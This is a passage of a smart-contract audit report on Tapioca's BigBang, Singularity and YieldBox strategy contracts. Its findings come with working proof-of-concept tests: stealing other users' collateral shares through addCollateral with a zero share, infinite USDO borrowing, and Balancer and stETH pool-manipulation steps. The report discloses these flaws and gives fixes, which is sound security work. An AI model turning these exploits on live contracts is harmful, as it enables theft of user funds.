The issue is that the collateralizationRate is multiplied by collateralShare (with precision constants) then converted to amount. This is incorrect, **the collateralizationRate sholud be used with amounts and not shares. Otherwise, we get wrong results**.

```solidity
yieldBox.toAmount(
			collateralId,
			collateralShare *
				(EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
				collateralizationRate,
			false
		)
```

Please note that when using shares **it is not in favour of the protocol**, so amounts should be used instead. The only case where this is ok, is when the share/amount ratio is 1:1 which can not be, because totalAmount always get +1 and totalShares +1e8 to prevent 1:1 ratio type of attack.

```solidity
    function _toAmount(
        uint256 share,
        uint256 totalShares_,
        uint256 totalAmount,
        bool roundUp
    ) internal pure returns (uint256 amount) {
        // To prevent reseting the ratio due to withdrawal of all shares, we start with
        // 1 amount/1e8 shares already burned. This also starts with a 1 : 1e8 ratio which
        // functions like 8 decimal fixed point math. This prevents ratio attacks or inaccuracy
        // due to 'gifting' or rebasing tokens. (Up to a certain degree)
        totalAmount++;
        totalShares_ += 1e8;

```

[Code link](https://github.com/Tapioca-DAO/YieldBox/blob/f5ad271b2dcab8b643b7cf622c2d6a128e109999/contracts/YieldBoxRebase.sol#L47-L52)

Moreover, in the method `_computeMaxAndMinLTVInAsset` which is supposed to returns the min and max LTV for user in asset price. Amount is used and not share. Here is the code:

    	function _computeMaxAndMinLTVInAsset(
    		uint256 collateralShare,
    		uint256 _exchangeRate
    	) internal view returns (uint256 min, uint256 max) {
    		uint256 collateralAmount = yieldBox.toAmount(
    			collateralId,
    			collateralShare,
    			false
    		);

    		max = (collateralAmount * EXCHANGE_RATE_PRECISION) / _exchangeRate;
    		min = (max * collateralizationRate) / FEE_PRECISION;
    	}

[Code Link](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L428-L440)

I've set this to high severity because solvency check is a crucial part of the protocol. In short, we have :

1.  Inconsistency across the protocol
2.  Inaccuracy of calculating the liquidation threshold
3.  Not in favour of the protocol

Note: this is also applicable for ohter methods. For example, `Market._computeMaxBorrowableAmount`.

### Proof of Concept

*   When you run the PoC below, you will get the following results:

```sh
[PASS] test_borrow_repay() (gas: 118001)
Logs:
  ===BORROW===
  UserBorrowPart: 745372500000000000000
  Total Borrow Base: 745372500000000000000
  Total Borrow Elastic: 745372500000000000000
  ===356 days passed===
  Total Borrow Elastic: 749089151896269477984
  ===Solvency#1 => multiply by share===
  A: 749999999999925000000750007499999924999
  B: 749089151896269477984000000000000000000
  ===Solvency#2 => multiply by amount===
  A: 749999999999925000000750000000000000000
  B: 749089151896269477984000000000000000000
  ===Result===
  Solvency#1.A != Solvency#2.A

Test result: ok. 1 passed; 0 failed; finished in 16.69ms
```

As you can see, numbers are not equal, and when using shares it is not in favour of the protocol, so amount should be used instead.

*   Code: Please note some lines in borrow method were commented out for simplicity. It is irrelevant anyway.
*   `_toAmount` copied from YieldBoxRebase

<details>

```solidity
// PoC => BIGBANG - Solvency Check Inaccuracy
// Command => forge test -vv
pragma solidity >=0.8.4 <0.9.0;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

import {DSTest} from "ds-test/test.sol";
struct AccrueInfo {
    uint64 debtRate;
    uint64 lastAccrued;
}

struct Rebase {
    uint128 elastic;
    uint128 base;
}

/// @notice A rebasing library using overflow-/underflow-safe math.
library RebaseLibrary {
    /// @notice Calculates the base value in relationship to `elastic` and `total`.
    function toBase(
        Rebase memory total,
        uint256 elastic,
        bool roundUp
    ) internal pure returns (uint256 base) {
        if (total.elastic == 0) {
            base = elastic;
        } else {
            base = (elastic * total.base) / total.elastic;
            if (roundUp && (base * total.elastic) / total.base < elastic) {
                base++;
            }
        }
    }

    /// @notice Calculates the elastic value in relationship to `base` and `total`.
    function toElastic(
        Rebase memory total,
        uint256 base,
        bool roundUp
    ) internal pure returns (uint256 elastic) {
        if (total.base == 0) {
            elastic = base;
        } else {
            elastic = (base * total.elastic) / total.base;
            if (roundUp && (elastic * total.base) / total.elastic < base) {
                elastic++;
            }
        }
    }

    /// @notice Add `elastic` to `total` and doubles `total.base`.
    /// @return (Rebase) The new total.
    /// @return base in relationship to `elastic`.
    function add(
        Rebase memory total,
        uint256 elastic,
        bool roundUp
    ) internal pure returns (Rebase memory, uint256 base) {
        base = toBase(total, elastic, roundUp);
        total.elastic += uint128(elastic);
        total.base += uint128(base);
        return (total, base);
    }

    /// @notice Sub `base` from `total` and update `total.elastic`.
    /// @return (Rebase) The new total.
    /// @return elastic in relationship to `base`.
    function sub(
        Rebase memory total,
        uint256 base,
        bool roundUp
    ) internal pure returns (Rebase memory, uint256 elastic) {
        elastic = toElastic(total, base, roundUp);
        total.elastic -= uint128(elastic);
        total.base -= uint128(base);
        return (total, elastic);
    }

    /// @notice Add `elastic` and `base` to `total`.
    function add(
        Rebase memory total,
        uint256 elastic,
        uint256 base
    ) internal pure returns (Rebase memory) {
        total.elastic += uint128(elastic);
        total.base += uint128(base);
        return total;
    }

    /// @notice Subtract `elastic` and `base` to `total`.
    function sub(
        Rebase memory total,
        uint256 elastic,
        uint256 base
    ) internal pure returns (Rebase memory) {
        total.elastic -= uint128(elastic);
        total.base -= uint128(base);
        return total;
    }

    /// @notice Add `elastic` to `total` and update storage.
    /// @return newElastic Returns updated `elastic`.
    function addElastic(
        Rebase storage total,
        uint256 elastic
    ) internal returns (uint256 newElastic) {
        newElastic = total.elastic += uint128(elastic);
    }

    /// @notice Subtract `elastic` from `total` and update storage.
    /// @return newElastic Returns updated `elastic`.
    function subElastic(
        Rebase storage total,
        uint256 elastic
    ) internal returns (uint256 newElastic) {
        newElastic = total.elastic -= uint128(elastic);
    }
}

contract BIGBANG_MOCK {
    using RebaseLibrary for Rebase;
    uint256 public collateralizationRate = 75000; // 75% // made public to access it from test contract
    uint256 public liquidationMultiplier = 12000; //12%
    uint256 public constant FEE_PRECISION = 1e5; // made public to access it from test contract
    uint256 public EXCHANGE_RATE_PRECISION = 1e18; //made public to access it from test contract

    uint256 public borrowOpeningFee = 50; //0.05%
    Rebase public totalBorrow;
    uint256 public totalBorrowCap;
    AccrueInfo public accrueInfo;

    /// @notice borrow amount per user
    mapping(address => uint256) public userBorrowPart;

    uint256 public USDO_balance; // just to track USDO balance of BigBang

    function _accrue() public {
        // made public so we can call it from the test contract
        AccrueInfo memory _accrueInfo = accrueInfo;
        // Number of seconds since accrue was called
        uint256 elapsedTime = block.timestamp - _accrueInfo.lastAccrued;
        if (elapsedTime == 0) {
            return;
        }
        //update debt rate // for simplicity we return bigBangEthDebtRate which is 5e15
        uint256 annumDebtRate = 5e15; // getDebtRate(); // 5e15 for eth. Check Penrose.sol Line:131
        _accrueInfo.debtRate = uint64(annumDebtRate / 31536000); //per second

        _accrueInfo.lastAccrued = uint64(block.timestamp);

        Rebase memory _totalBorrow = totalBorrow;

        uint256 extraAmount = 0;

        // Calculate fees
        extraAmount =
            (uint256(_totalBorrow.elastic) *
                _accrueInfo.debtRate *
                elapsedTime) /
            1e18;
        _totalBorrow.elastic += uint128(extraAmount);

        totalBorrow = _totalBorrow;
        accrueInfo = _accrueInfo;

        // emit LogAccrue(extraAmount, _accrueInfo.debtRate); // commented out since it irrelevant
    }

    function totalBorrowElastic() public view returns (uint128) {
        return totalBorrow.elastic;
    }

    function totalBorrowBase() public view returns (uint128) {
        return totalBorrow.base;
    }

    function _borrow(
        address from,
        address to,
        uint256 amount
    ) external returns (uint256 part, uint256 share) {
        uint256 feeAmount = (amount * borrowOpeningFee) / FEE_PRECISION; // A flat % fee is charged for any borrow

        (totalBorrow, part) = totalBorrow.add(amount + feeAmount, true);
        require(
            totalBorrowCap == 0 || totalBorrow.elastic <= totalBorrowCap,
            "BigBang: borrow cap reached"
        );

        userBorrowPart[from] += part; // toBase from RebaseLibrary. userBorrowPart stores the sharee

        //mint USDO
        // IUSDOBase(address(asset)).mint(address(this), amount); // not needed
        USDO_balance += amount;

        //deposit borrowed amount to user
        // asset.approve(address(yieldBox), amount);  // not needed
        // yieldBox.depositAsset(assetId, address(this), to, amount, 0); // not needed
        USDO_balance -= amount;

        // share = yieldBox.toShare(assetId, amount, false); // not needed

        // emit LogBorrow(from, to, amount, feeAmount, part); // not needed
    }

    // copied from YieldBoxRebase
    function _toAmount(
        uint256 share,
        uint256 totalShares_,
        uint256 totalAmount,
        bool roundUp
    ) external pure returns (uint256 amount) {
        // To prevent reseting the ratio due to withdrawal of all shares, we start with
        // 1 amount/1e8 shares already burned. This also starts with a 1 : 1e8 ratio which
        // functions like 8 decimal fixed point math. This prevents ratio attacks or inaccuracy
        // due to 'gifting' or rebasing tokens. (Up to a certain degree)
        totalAmount++;
        totalShares_ += 1e8;

        // Calculte the amount using te current amount to share ratio
        amount = (share * totalAmount) / totalShares_;

        // Default is to round down (Solidity), round up if required
        if (roundUp && (amount * totalShares_) / totalAmount < share) {
            amount++;
        }
    }
}

contract BIGBANG_ISSUES is DSTest, Test {
    BIGBANG_MOCK bigbangMock;
    address bob;

    function setUp() public {
        bigbangMock = new BIGBANG_MOCK();
        bob = vm.addr(1);
    }

    function test_borrow_repay() public {
        // borrow
        uint256 amount = 745e18;

        vm.warp(1 days);
        bigbangMock._accrue(); // acrrue before borrow (this is done on borrow)

        bigbangMock._borrow(bob, address(0), amount);
        console.log("===BORROW===");
        // console.log("Amount: %d", amount);
        console.log("UserBorrowPart: %d", bigbangMock.userBorrowPart(bob));
        console.log("Total Borrow Base: %d", bigbangMock.totalBorrowBase());
        console.log(
            "Total Borrow Elastic: %d",
            bigbangMock.totalBorrowElastic()
        );

        // time elapsed
        vm.warp(365 days);
        console.log("===356 days passed===");
        bigbangMock._accrue();
        console.log(
            "Total Borrow Elastic: %d",
            bigbangMock.totalBorrowElastic()
        ); 

        // Check Insolvency

        uint256 _exchangeRate = 1e18;
        uint256 collateralShare = 1000e18;
        uint256 totalShares = 1000e18;
        uint256 totalAmount = 1000e18;
        uint256 EXCHANGE_RATE_PRECISION = bigbangMock.EXCHANGE_RATE_PRECISION();
        uint256 FEE_PRECISION = bigbangMock.FEE_PRECISION();
        uint256 collateralizationRate = bigbangMock.collateralizationRate();

        uint256 borrowPart = bigbangMock.userBorrowPart(bob);
        uint256 _totalBorrowElastic = bigbangMock.totalBorrowElastic();
        uint256 _totalBorrowBase = bigbangMock.totalBorrowBase();



        console.log("===Solvency#1 => multiply by share===");
        // we pass totalShares and totalAmount
        uint256 A = bigbangMock._toAmount(
            collateralShare *
                (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
                collateralizationRate,
            totalShares,
            totalAmount,
            false
        );

        // Moved exchangeRate here instead of dividing the other side to preserve more precision
        uint256 B = (borrowPart * _totalBorrowElastic * _exchangeRate) /
            _totalBorrowBase;

        // bool isSolvent = A >= B;

        console.log("A: %d", A);
        console.log("B: %d", B);


        console.log("===Solvency#2 => multiply by amount===");

        A =
            bigbangMock._toAmount(
                collateralShare,
                totalShares,
                totalAmount,
                false
            ) *
            (EXCHANGE_RATE_PRECISION / FEE_PRECISION) *
            collateralizationRate;

        // Moved exchangeRate here instead of dividing the other side to preserve more precision
        B =
            (borrowPart * _totalBorrowElastic * _exchangeRate) /
            _totalBorrowBase;

        // isSolvent = A >= B;

        console.log("A: %d", A);
        console.log("B: %d", B);


        console.log("===Result===");
        console.log("Solvency#1.A != Solvency#2.A");

    }
}
```

</details>

### Recommended Mitigation Steps

Use amount for calculation instead of shares. Check the PoC as it demonstrates such an example.

**[0xRektora (sponsor) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1582#issuecomment-1703067281)**

***

## [[H-05]  Ability to steal user funds and increase collateral share infinitely in BigBang and Singularity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1567)
*Submitted by [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1567), also found by Koolex ([1](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1597), [2](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1593)), [RedOneN](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1542), [plainshift](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1400), [ladboy233](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1383), [bin2chen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1308), [zzzitron](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1289), [ayeslick](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1270), [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1115), [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/670), [xuwinnie](https://github.com/code-423n4/2023-07-tapioca-findings/issues/617), [Oxsadeeq](https://github.com/code-423n4/2023-07-tapioca-findings/issues/472), [0xStalin](https://github.com/code-423n4/2023-07-tapioca-findings/issues/312), [0xG0P1](https://github.com/code-423n4/2023-07-tapioca-findings/issues/237), [ltyu](https://github.com/code-423n4/2023-07-tapioca-findings/issues/184), [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/150), [TiesStevelink](https://github.com/code-423n4/2023-07-tapioca-findings/issues/117), [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/115), and [0xRobocop](https://github.com/code-423n4/2023-07-tapioca-findings/issues/55)*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L288> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLCollateral.sol#L27>



The `addCollateral` methods in both BigBang and Singularity contracts allow the share parameter to be passed as `0`. When `share` is `0`, the equivalent amount of shares is calculated using the YieldBox `toShare` method. However, there is a modifier named `allowedBorrow` that is intended to check the allowed borrowing amount for each implementation of the `addCollateral` methods. Unfortunately, the modifier is called with the `share` value passed to `addCollateral`, and in the case of `0`, it will always pass.

<details>

```solidity
// MarketERC20.sol
function _allowedBorrow(address from, uint share) internal {
    if (from != msg.sender) {
        if (allowanceBorrow[from][msg.sender] < share) {
            revert NotApproved(from, msg.sender);
        }
        allowanceBorrow[from][msg.sender] -= share;
    }
}

// BigBang.sol
function addCollateral(
    address from,
    address to,
    bool skim,
    uint256 amount,
    uint256 share
    // @audit share is calculated afterwords the modifier
) public allowedBorrow(from, share) notPaused {
    _addCollateral(from, to, skim, amount, share);
}

function _addCollateral(
    address from,
    address to,
    bool skim,
    uint256 amount,
    uint256 share
) internal {
    if (share == 0) {
        share = yieldBox.toShare(collateralId, amount, false);
    }
    userCollateralShare[to] += share;
    uint256 oldTotalCollateralShare = totalCollateralShare;
    totalCollateralShare = oldTotalCollateralShare + share;
    _addTokens(
        from,
        to,
        collateralId,
        share,
        oldTotalCollateralShare,
        skim
    );
    emit LogAddCollateral(skim ? address(yieldBox) : from, to, share);
}
```

</details>

This leads to various critical scenarios in BigBang and Singularity markets where user assets can be stolen, and collateral share can be increased infinitely which in turn leads to infinite USDO borrow/mint and borrowing max assets from Singularity market.

Refer to [Proof of Concept](#proof-of-concept) for attack examples

### Impact

High - allows stealing of arbitrary user yieldbox shares in BigBang contract and Singularity. In the case of BigBang this leads to infinite minting of USDO. Effectively draining all markets and LPs where USDO has value. In the case of Singularity this leads to infinite borrowing, allowing an attacker to obtain possession of all other users' collateral in Singularity.

### Proof of concept

1.  Malicious actor can add any user shares that were approved to BigBang or Singularity contracts deployed. This way adversary is stealing user shares that he can unwrap to get underlying collateral provided.

<details>

```solidity
it('allows steal other user YieldBox collateral shares', async () => {
    const {
        wethBigBangMarket,
        weth,
        wethAssetId,
        yieldBox,
        deployer: userA,
        eoa1: userB,
    } = await loadFixture(register);

    await weth.approve(yieldBox.address, ethers.constants.MaxUint256);
    await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);

    const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
        10,
    );
    await weth.freeMint(wethMintVal);
    const valShare = await yieldBox.toShare(
        wethAssetId,
        wethMintVal,
        false,
    );

    // User A deposit assets to yieldbox, receives shares
    await yieldBox.depositAsset(
        wethAssetId,
        userA.address,
        userA.address,
        0,
        valShare,
    );
    let userABalance = await yieldBox.balanceOf(
        userA.address,
        wethAssetId,
    )
    expect(userABalance.gt(0)).to.be.true;
    expect(userABalance.eq(valShare)).to.be.true;

    // User B adds collateral to big bang from user A shares
    await expect(wethBigBangMarket.connect(userB).addCollateral(
        userA.address,
        userB.address,
        false,
        wethMintVal,
        0,
    )).to.emit(yieldBox, "TransferSingle")
        .withArgs(wethBigBangMarket.address, userA.address, wethBigBangMarket.address, wethAssetId, valShare);

    userABalance = await yieldBox.balanceOf(
        userA.address,
        wethAssetId,
    )
    expect(userABalance.eq(0)).to.be.true;

    let collateralShares = await wethBigBangMarket.userCollateralShare(
        userB.address,
    );
    expect(collateralShares.gt(0)).to.be.true;
    expect(collateralShares.eq(valShare)).to.be.true;

    // User B removes collateral
    await wethBigBangMarket.connect(userB).removeCollateral(
        userB.address,
        userB.address,
        collateralShares,
    );

    collateralShares = await wethBigBangMarket.connect(userB).userCollateralShare(
        userA.address,
    );
    expect(collateralShares.eq(0)).to.be.true;

    // User B ends up with User A shares in yieldbox
    let userBBalance = await yieldBox.balanceOf(
        userB.address,
        wethAssetId,
    )
    expect(userBBalance.gt(0)).to.be.true;
    expect(userBBalance.eq(valShare)).to.be.true;
});
```

</details>

2.  For Singularity contract this allows to increase collateralShare by the amount of assets provided as collateral infinitely leading to `x / x + 1` share of the collateral for the caller with no shares in the pool, where x is the number of times  the `addColateral` is called, effectively allowing for infinite borrowing. As a consequence, the attacker can continuously increase their share of the collateral without limits, leading to potentially excessive borrowing of assets from the Singularity market.

<details>

```solidity
it('allows to infinitely increase user collateral share in BigBang', async () => {
    const {
        wethBigBangMarket,
        weth,
        wethAssetId,
        yieldBox,
        deployer: userA,
        eoa1: userB,
    } = await loadFixture(register);

    await weth.approve(yieldBox.address, ethers.constants.MaxUint256);
    await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);

    const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
        10,
    );
    await weth.freeMint(wethMintVal);
    const valShare = await yieldBox.toShare(
        wethAssetId,
        wethMintVal,
        false,
    );

    // User A deposit assets to yieldbox, receives shares
    await yieldBox.depositAsset(
        wethAssetId,
        userA.address,
        userA.address,
        0,
        valShare,
    );
    let userABalance = await yieldBox.balanceOf(
        userA.address,
        wethAssetId,
    )
    expect(userABalance.gt(0)).to.be.true;
    expect(userABalance.eq(valShare)).to.be.true;

    // User A adds collateral to BigBang
    await wethBigBangMarket.addCollateral(
        userA.address,
        userA.address,
        false,
        wethMintVal,
        0,
    );
    let bigBangBalance = await yieldBox.balanceOf(
        wethBigBangMarket.address,
        wethAssetId,
    )
    expect(bigBangBalance.eq(valShare)).to.be.true;
    let userACollateralShare = await wethBigBangMarket.userCollateralShare(
        userA.address,
    );
    expect(userACollateralShare.gt(0)).to.be.true;
    expect(userACollateralShare.eq(valShare)).to.be.true;
    let userBCollateralShare = await wethBigBangMarket.userCollateralShare(
        userB.address,
    );
    expect(userBCollateralShare.eq(0)).to.be.true;

    // User B is able to increase his share to 50% of the whole collateral added
    await expect(wethBigBangMarket.connect(userB).addCollateral(
        wethBigBangMarket.address,
        userB.address,
        false,
        wethMintVal,
        0,
    )).to.emit(yieldBox, "TransferSingle")

    userBCollateralShare = await wethBigBangMarket.userCollateralShare(
        userB.address,
    );

    expect(userBCollateralShare.gt(0)).to.be.true;
    expect(userBCollateralShare.eq(valShare)).to.be.true;

    // User B is able to increase his share to 66% of the whole collateral added
    await expect(wethBigBangMarket.connect(userB).addCollateral(
        wethBigBangMarket.address,
        userB.address,
        false,
        wethMintVal,
        0,
    )).to.emit(yieldBox, "TransferSingle")

    userBCollateralShare = await wethBigBangMarket.userCollateralShare(
        userB.address,
    );

    expect(userBCollateralShare.gt(0)).to.be.true;
    expect(userBCollateralShare.eq(valShare.mul(2))).to.be.true;

    // ....
});
```

</details>

3.  In the BigBang contract, this vulnerability allows a user to infinitely increase their collateral shares by providing collateral repeatedly. As a result, the user can artificially inflate their collateral shares provided, potentially leading to an excessive borrowing capacity. By continuously adding collateral without limitations, the user can effectively borrow against any collateral amount they desire, which poses a significant risk to USDO market.

<details>

```solidity
it('allows infinite borrow of USDO', async () => {
    const {
        wethBigBangMarket,
        weth,
        wethAssetId,
        yieldBox,
        deployer: userA,
        eoa1: userB,
    } = await loadFixture(register);

    await weth.approve(yieldBox.address, ethers.constants.MaxUint256);
    await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);

    const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
        10,
    );
    await weth.freeMint(wethMintVal);
    const valShare = await yieldBox.toShare(
        wethAssetId,
        wethMintVal,
        false,
    );

    // User A deposit assets to yieldbox, receives shares
    await yieldBox.depositAsset(
        wethAssetId,
        userA.address,
        userA.address,
        0,
        valShare,
    );
    let userABalance = await yieldBox.balanceOf(
        userA.address,
        wethAssetId,
    )
    expect(userABalance.gt(0)).to.be.true;
    expect(userABalance.eq(valShare)).to.be.true;

    // User A adds collateral to BigBang
    await wethBigBangMarket.addCollateral(
        userA.address,
        userA.address,
        false,
        wethMintVal,
        0,
    );
    let bigBangBalance = await yieldBox.balanceOf(
        wethBigBangMarket.address,
        wethAssetId,
    )
    expect(bigBangBalance.eq(valShare)).to.be.true;
    let userACollateralShare = await wethBigBangMarket.userCollateralShare(
        userA.address,
    );
    expect(userACollateralShare.gt(0)).to.be.true;
    expect(userACollateralShare.eq(valShare)).to.be.true;

    await wethBigBangMarket.borrow(userA.address, userA.address, "7450000000000000000000");

    await expect(
        wethBigBangMarket.borrow(userA.address, userA.address, "7450000000000000000000")
    ).to.be.reverted;

    await expect(wethBigBangMarket.addCollateral(
        wethBigBangMarket.address,
        userA.address,
        false,
        wethMintVal,
        0,
    )).to.emit(yieldBox, "TransferSingle")

    await wethBigBangMarket.borrow(userA.address, userA.address, "7500000000000000000000");

    await expect(wethBigBangMarket.addCollateral(
        wethBigBangMarket.address,
        userA.address,
        false,
        wethMintVal,
        0,
    )).to.emit(yieldBox, "TransferSingle")

    await wethBigBangMarket.borrow(userA.address, userA.address, "7530000000000000000000");

    // ....
});
```

</details>

### Recommended Mitigation Steps

*   Check allowed to borrow shares amount after evaluating equivalent them

**[0xRektora (Tapioca) confirmed via duplicate issue 55](https://github.com/code-423n4/2023-07-tapioca-findings/issues/55)**

***

## [[H-06] BalancerStrategy `_withdraw` uses `BPT_IN_FOR_EXACT_TOKENS_OUT` which can be attack to cause loss to all depositors](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1449)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1449)*

Withdrawals can be manipulated to cause complete loss of all tokens.

The BalancerStrategy accounts for user deposits in terms of the BPT shares they contributed, however, for withdrawals, it estimates the amount of BPT to burn based on the amount of ETH to withdraw, which can be manipulated to cause a total loss to the Strategy.

Deposits of weth are done via userData.joinKind set to `1`, which is extracted here in the generic Pool Logic:<br>
<https://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L49>

The interpretation (by convention is shown here):<br>
<https://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L49>
```
    enum JoinKind { INIT, EXACT_TOKENS_IN_FOR_BPT_OUT, TOKEN_IN_FOR_EXACT_BPT_OUT }
```

Which means that the deposit is using `EXACT_TOKENS_IN_FOR_BPT_OUT` which is safe in most circumstances (Pool Properly Balanced, with minimum liquidity).

### `BPT_IN_FOR_EXACT_TOKENS_OUT` is vulnerable to manipulation

`_vaultWithdraw` uses the following logic to determine how many BPT to burn:

<https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/balancer/BalancerStrategy.sol#L224-L242>

```solidity
uint256[] memory minAmountsOut = new uint256[](poolTokens.length);
        for (uint256 i = 0; i < poolTokens.length; i++) {
            if (poolTokens[i] == address(wrappedNative)) {
                minAmountsOut[i] = amount;
                index = int256(i);
            } else {
                minAmountsOut[i] = 0;
            }
        }

        IBalancerVault.ExitPoolRequest memory exitRequest;
        exitRequest.assets = poolTokens;
        exitRequest.minAmountsOut = minAmountsOut;
        exitRequest.toInternalBalance = false;
        exitRequest.userData = abi.encode(
            2,
            exitRequest.minAmountsOut,
            pool.balanceOf(address(this))
        );
```

This query logic is using `2`, which Maps out to `BPT_IN_FOR_EXACT_TOKENS_OUT` which means Exact Out, with any (all) BPT IN, this means that the swapper is willing to burn all tokens:<br>
<https://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L51>
```
        enum ExitKind { EXACT_BPT_IN_FOR_ONE_TOKEN_OUT, EXACT_BPT_IN_FOR_TOKENS_OUT, BPT_IN_FOR_EXACT_TOKENS_OUT }
```

This meets the 2 prerequisite for stealing value from the vault by socializing loss due to single sided exposure:

*   1.  The request is for at least `amount` `WETH`
*   2.  The request is using `BPT_IN_FOR_EXACT_TOKENS_OUT`

Which means the strategy will accept any slippage, in this case 100%, causing it to take a total loss for the goal of allowing a withdrawal, at the advantage of the attacker and the detriment of all other depositors.

### POC

The requirement to trigger the loss are as follows:

*   Deposit to have some amount of BPTs deposited into the strategy
*   Imbalance the Pool to cause pro-rata amount of single token to require burning a lot more BPTs
*   Withdraw from the strategy, the strategy will burn all of the BPTs it owns (more than the shares)
*   Rebalance the pool with the excess value burned from the strategy

### Further Details

Specifically, in withdrawing one Depositor Shares, the request would end up burning EVERYONEs shares, causing massive loss to everyone.

This has already been exploited and explained in Yearns Disclosure:

<https://github.com/yearn/yearn-security/blob/master/disclosures/2022-01-30.md>

More specifically this finding can cause a total loss, while trying to withdraw tokens for a single user, meaning that an attacker can setup the pool to cause a complete loss to all other stakers.

### Mitigation Step

Use `EXACT_BPT_IN_FOR_TOKENS_OUT` and denominate the Strategy in LP tokens to avoid being attacked via single sided exposure.

**[cryptotechmaker (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1449#issuecomment-1707830222)**

***

## [[H-07] Usage of `BalancerStrategy.updateCache` will cause single sided Loss, discount to Depositor and to OverBorrow from Singularity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1447)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1447), also found by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/977), [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/968), and [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/780)*

The BalancerStrategy uses a cached value to determine it's balance in pool for which it takes Single Sided Exposure.

This means that the Strategy has some BPT tokens, but to price them, it's calling `vault.queryExit` which simulates withdrawing the LP in a single sided manner.

Due to the single sided exposure, it's trivial to perform a Swap, that will change the internal balances of the pool, as a way to cause the Strategy to discount it's tokens.

By the same process, we can send more ETH as a way to inflate the value of the Strategy, which will then be cached.

Since `_currentBalance` is a view-function, the YieldBox will accept these inflated values without a way to dispute them

<https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/balancer/BalancerStrategy.sol#L138-L147>

```solidity
    function _deposited(uint256 amount) internal override nonReentrant {
        uint256 queued = wrappedNative.balanceOf(address(this));
        if (queued > depositThreshold) {
            _vaultDeposit(queued);
            emit AmountDeposited(queued);
        }
        emit AmountQueued(amount);

        updateCache(); /// @audit this is updated too late (TODO PROOF)
    }
```

### POC

*   Imbalance the pool (Sandwich A)
*   Update `updateCache`
*   Deposit into YieldBox, YieldBox is using a `view` function, meaning it will use the manipulated strategy `_currentBalance`
*   `_deposited` trigger an `updateCache`
*   Rebalance the Pool (Sandwich B)
*   Call `updateCache` again to bring back the rate to a higher value
*   Withdraw at a gain

### Result

Imbalance Up -> Allows OverBorrowing and causes insolvency to the protocol
Imbalance Down -> Liquidate Borrowers unfairly at a profit to the liquidator
Sandwhiching the Imbalance can be used to extract value from the strategy and steal user deposits as well

### Mitigation

Use fair reserve math, avoid single sided exposure (use the LP token as underlying, not one side of it)

**[cryptotechmaker (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1447#issuecomment-1707823835)**

***

## [[H-08] `LidoEthStrategy._currentBalance` is subject to price manipulation, allows overborrowing and liquidations](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1432)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1432), also found by [ladboy233](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1361), [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/992), [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/828), [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/776), and [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/248)*

The strategy is pricing stETH as ETH by asking the pool for it's return value

This is easily manipulatable by performing a swap big enough

<https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/lido/LidoEthStrategy.sol#L118-L125>

```solidity
    function _currentBalance() internal view override returns (uint256 amount) {
        uint256 stEthBalance = stEth.balanceOf(address(this));
        uint256 calcEth = stEthBalance > 0
            ? curveStEthPool.get_dy(1, 0, stEthBalance) // TODO: Prob manipulatable view-reentrancy
            : 0;
        uint256 queued = wrappedNative.balanceOf(address(this));
        return calcEth + queued;
    }

    /// @dev deposits to Lido or queues tokens if the 'depositThreshold' has not been met yet
    function _deposited(uint256 amount) internal override nonReentrant {
